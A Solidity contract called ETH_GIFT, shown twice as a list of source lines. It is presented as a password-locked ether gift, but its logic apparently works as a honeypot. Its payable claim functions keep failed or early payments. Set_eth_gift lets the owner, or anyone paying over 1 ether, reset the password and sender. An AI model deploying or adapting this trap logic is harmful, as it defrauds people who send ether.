['pragma solidity ^0.4.19;\n', '\n', 'contract ETH_GIFT\n', '{\n', '    function GetGift(bytes pass) external payable canOpen {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function GetGift() public payable canOpen {\n', '        if(msg.sender==reciver)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    bytes32 hashPass;\n', '    bool closed = false;\n', '    address sender;\n', '    address reciver;\n', '    uint giftTime;\n', ' \n', '    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function Set_eth_gift(bytes32 hash) public payable {\n', '        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '            giftTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetGiftTime(uint date) public canOpen {\n', '        if(msg.sender==sender)\n', '        {\n', '            giftTime = date;\n', '        }\n', '    }\n', '    \n', '    function SetReciver(address _reciver) public {\n', '        if(msg.sender==sender)\n', '        {\n', '            reciver = _reciver;\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash) public {\n', '        if(hash==hashPass&&msg.sender==sender)\n', '        {\n', '           closed=true;\n', '        }\n', '    }\n', '    \n', '    modifier canOpen(){\n', '        if(now>giftTime)_;\n', '        else return;\n', '    }\n', '    \n', '    function() public payable{}\n', '    \n', '}']
['pragma solidity ^0.4.19;\n', '\n', 'contract ETH_GIFT\n', '{\n', '    function GetGift(bytes pass) external payable canOpen {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function GetGift() public payable canOpen {\n', '        if(msg.sender==reciver)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    bytes32 hashPass;\n', '    bool closed = false;\n', '    address sender;\n', '    address reciver;\n', '    uint giftTime;\n', ' \n', '    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function Set_eth_gift(bytes32 hash) public payable {\n', '        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '            giftTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetGiftTime(uint date) public canOpen {\n', '        if(msg.sender==sender)\n', '        {\n', '            giftTime = date;\n', '        }\n', '    }\n', '    \n', '    function SetReciver(address _reciver) public {\n', '        if(msg.sender==sender)\n', '        {\n', '            reciver = _reciver;\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash) public {\n', '        if(hash==hashPass&&msg.sender==sender)\n', '        {\n', '           closed=true;\n', '        }\n', '    }\n', '    \n', '    modifier canOpen(){\n', '        if(now>giftTime)_;\n', '        else return;\n', '    }\n', '    \n', '    function() public payable{}\n', '    \n', '}']
